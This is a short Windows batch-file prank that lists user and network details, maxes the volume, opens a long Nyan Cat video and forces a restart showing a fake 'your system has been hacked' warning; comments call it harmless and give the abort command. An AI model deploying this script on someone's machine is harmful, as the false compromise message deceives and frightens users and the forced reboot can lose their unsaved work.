run powershell_ise.exe
color a 
title Destroy Computer
cls
ipconfig
whoami /all
net users
tree

:: #1 This will run CMD in a bat file mode and will run the commands above. all of which are harmeless.

@echo off
setlocal

REM Set the volume to 100 using PowerShell

for /l %%x in (1, 1, 50) do powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"

:: #2 This will set the volume to maximum volume using the loop

start "" https://www.youtube.com/watch?v=Ul1JM6CajeQ

:: #3 Open the web-based video in the default web browser - MSEdge / GChrome

endlocal


shutdown /r /c "System Warning: Your system has been hacked. Once restart is complete. This computer will stop working. - MrRedHalwa :) "


:: #4 CMD batfile runs and launches Nyan Cat 4k 12hours and sets vol. to maximum


:: #5 This will start the restart process. The restart can be aborted by placing "shutdown -a" without the quotation marks to abort the system logoff and restart
